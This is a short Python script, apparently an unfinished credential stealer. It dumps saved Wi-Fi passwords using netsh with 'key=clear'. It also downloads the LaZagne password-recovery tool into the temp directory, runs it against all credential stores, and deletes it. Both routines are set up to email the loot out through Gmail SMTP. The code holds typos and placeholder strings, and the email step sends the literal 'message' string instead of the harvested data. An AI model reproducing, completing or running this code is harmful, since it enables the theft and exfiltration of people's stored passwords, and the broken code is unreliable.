import requests, subprocess, smtplib, re, os, tempfile

def download(url):
    get_sponse = requests.get(url)
    # file_name = url.split("/")[-1]
    file_name = "dowloaded_file"
    with open(file_name, "wb") as out_file:
        out_file.write(get_sponse.content)

download("url")

def send_email(to_email, from_email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_email, password)
    server.sendmail(to_email, from_email, message)
    server.quit()

def run_netsh():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell = True)
    network_names_list = re.findall("(?:Profiles\s*:\s)(.*)", networks)

    result = ""
    for network_name in network_names_list:
        command = "netsh wlan prfile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result

    send_email("to_email", "from_email", "password", "message" )

def run_lazagne():
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)
    download("url laZagne")
    result = subprocess.check_output("laZagne,exe all", shell=True)
    send_email("to_email", "from_email", "password", "message" )
    os.remove("laZagne.exe")